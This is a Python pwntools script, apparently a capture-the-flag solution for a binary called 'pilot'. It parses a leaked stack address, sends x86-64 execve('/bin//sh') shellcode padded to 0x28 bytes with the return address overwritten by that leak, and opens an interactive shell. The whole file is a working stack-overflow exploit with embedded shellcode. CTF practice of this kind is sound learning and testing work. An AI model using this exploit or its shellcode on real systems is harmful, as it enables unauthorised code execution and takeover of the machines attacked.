#!/usr/bin/python3

from pwn import *

target = process('./pilot')
#target = gdb.debug('./pilot','''
#b *0x400b34
#c
#''')

shellcode = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

for _ in range(6):
    print(target.recvline())

leak = target.recvline()
leak = str(leak).split(':')[1].split('\\')[0]
leak = int(leak, 16)

payload = shellcode
payload += b'A' * (0x28 - len(shellcode))
payload += p64(leak)

print(target.recvuntil(b'Command:'))
target.sendline(payload)
target.interactive()
